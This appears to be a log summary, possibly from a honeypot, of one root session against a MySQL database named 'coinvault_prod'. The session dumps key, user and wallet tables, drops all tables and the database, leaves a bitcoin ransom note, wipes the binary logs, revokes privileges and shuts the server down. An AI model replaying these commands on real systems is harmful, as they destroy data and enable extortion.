
-- 64.89.163.179 --
  Connections : 28
  Logins      : 28
  Usernames   : root
  Queries     : 90  (46 unique)
  First seen  : 2026-05-24 08:26
  Last seen   : 2026-05-24 08:27

  Unique queries (46, chronological):
    - SET AUTOCOMMIT=0
    - SHOW DATABASES
    - SELECT SUM(data_length + index_length) FROM information_schema.tables WHERE table_schema = 'coinvault_prod'
    - USE `coinvault_prod`
    - SHOW tables
    - /*!40100 SET @@SQL_MODE='' */
    - /*M!100100 SET @@MAX_STATEMENT_TIME=0.000000 */
    - /*M!100100 SET WAIT_TIMEOUT=DEFAULT */
    - set optimizer_switch='semijoin=off'
    - SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='coinvault_prod' AND TABLE_NAME IN ('api_keys'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME
    - SELECT * FROM api_keys LIMIT 10
    - SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='coinvault_prod' AND TABLE_NAME IN ('transactions'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME
    - SELECT * FROM transactions LIMIT 10
    - SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='coinvault_prod' AND TABLE_NAME IN ('withdrawals'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME
    - SELECT * FROM withdrawals LIMIT 10
    - SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='coinvault_prod' AND TABLE_NAME IN ('users'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME
    - SELECT * FROM users LIMIT 50
    - SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='coinvault_prod' AND TABLE_NAME IN ('wallets'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME
    - SELECT * FROM wallets LIMIT 50
    - SELECT LOGFILE_GROUP_NAME, FILE_NAME, TOTAL_EXTENTS, INITIAL_SIZE, ENGINE, EXTRA FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'UNDO LOG' AND FILE_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IS NOT NULL AND LOGFILE_GROUP_NAME IN (SELECT DISTINCT LOGFILE_GROUP_NAME FROM INFORMATION_SCHEMA.FILES WHERE FILE_TYPE = 'DATAFILE' AND TABLESPACE_NAME IN (SELECT DISTINCT TABLESPACE_NAME FROM INFORMATION_SCHEMA.PARTITIONS WHERE TABLE_SCHEMA='coinvault_prod' AND TABLE_NAME IN ('admin_users'))) GROUP BY LOGFILE_GROUP_NAME, FILE_NAME, ENGINE, TOTAL_EXTENTS, INITIAL_SIZE ORDER BY LOGFILE_GROUP_NAME
    - SELECT * FROM admin_users LIMIT 50
    - SHOW TABLES
    - SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'coinvault_prod' AND TABLE_NAME = 'admin_users' AND REFERENCED_TABLE_NAME IS NOT NULL
    - SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'coinvault_prod' AND TABLE_NAME = 'withdrawals' AND REFERENCED_TABLE_NAME IS NOT NULL
    - SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'coinvault_prod' AND TABLE_NAME = 'transactions' AND REFERENCED_TABLE_NAME IS NOT NULL
    - SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'coinvault_prod' AND TABLE_NAME = 'api_keys' AND REFERENCED_TABLE_NAME IS NOT NULL
    - SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'coinvault_prod' AND TABLE_NAME = 'wallets' AND REFERENCED_TABLE_NAME IS NOT NULL
    - SELECT TABLE_NAME, COLUMN_NAME, CONSTRAINT_NAME, REFERENCED_TABLE_NAME, REFERENCED_COLUMN_NAME FROM information_schema.KEY_COLUMN_USAGE WHERE TABLE_SCHEMA = 'coinvault_prod' AND TABLE_NAME = 'users' AND REFERENCED_TABLE_NAME IS NOT NULL
    - DROP TABLE `admin_users`
    - DROP TABLE `withdrawals`
    - DROP TABLE `transactions`
    - DROP TABLE `api_keys`
    - DROP TABLE `wallets`
    - DROP TABLE `users`
    - CREATE TABLE IF NOT EXISTS RECOVER_YOUR_DATA (text VARCHAR(255))
    - INSERT INTO RECOVER_YOUR_DATA (text) VALUES ('All your data was backed up by us. You must pay 0.0110 bitcoin to bc1q4da6h2l6cdz8vcphnxvn8ssurlvhyqs6ng8m45 or in 48 hours, your data will be publicly disclosed and deleted. ')
    - INSERT INTO RECOVER_YOUR_DATA (text) VALUES (' (for more information visit https://2info.win/mysql) After payment send mail to ak+2tnuj@onionmail.org and we will provide a link for you to download your data. Your DATAID is: 2TNUJ')
    - COMMIT
    - DROP DATABASE `coinvault_prod`
    - CREATE DATABASE IF NOT EXISTS RECOVER_YOUR_DATA
    - USE RECOVER_YOUR_DATA
    - RESET MASTER
    - SHOW MASTER STATUS
    - REVOKE INSERT, UPDATE, DELETE, DROP, CREATE ON *.* FROM ``@'%'
    - SHUTDOWN
    - SELECT JSON_SCHEMA_VALID('{"enum":[0]}', '\"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\"')
